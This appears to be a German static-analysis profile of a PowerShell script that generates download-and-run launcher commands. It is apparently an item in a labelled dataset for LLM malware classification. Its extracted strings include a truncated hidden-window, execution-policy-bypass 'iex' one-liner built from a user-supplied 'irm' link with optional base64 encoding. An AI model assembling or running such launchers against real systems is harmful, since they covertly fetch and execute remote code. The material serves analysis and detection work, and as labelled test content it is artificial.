# Steckbrief: tech_000_makeirm.ps1

- SHA256: `be4ad4c460e68881384b2bd262fc0104c082838ff4a85394add2dd1ca54e641a`
- Groesse: 2129 Bytes, 56 Zeilen
- Ground-Truth-Label (aus Ordner): **techniques**
- Kein Urteil enthalten. Bewertung erfolgt durch das LLM.

## Stufe 1 - Reine Extraktion
- Strings gesamt: 13 (Auszug unten)
- Base64-Bloecke gesamt: 0, davon dekodierbar: 0
- Strings (Auszug):
  - `Do you want to do Basic or BASE64 + M.E.? (Enter 'Basic' or 'BASE64')`
  - `Basic`
  - `BASE64`
  - `Enter the script name (without extension)`
  - `Enter the irm link`
  - `https://`
  - `^https://`
  - `

        # Check if $scriptName is blank, and construct the command accordingly
        if ([string]::IsNullOrWhiteS`
  - `) {
            # Ask for function name for iex (allow blank input)
            $functionName = Read-Host "Enter the f`
  - `) {
            # Form the command
            $command = @"
powershell -NoP -W H -Ep Bypass iex([System.Text.Encodin`
  - `$scriptName.txt`
  - `Command saved to $txtFilePath`
  - `Invalid choice. Exiting...`

## Stufe 2 - Statische Merkmale (zusaetzlich)
- Auffaellige Tokens (Name: Vorkommen):
  - frombase64: 1
  - noprofile: 3
- Cmdlets: Join-Path, Out-File, Read-Host, Write-Host

## Stufe 3 - Struktur (zusaetzlich)
- Beobachtete Abfolge:
  1. Base64-Inhalt dekodieren
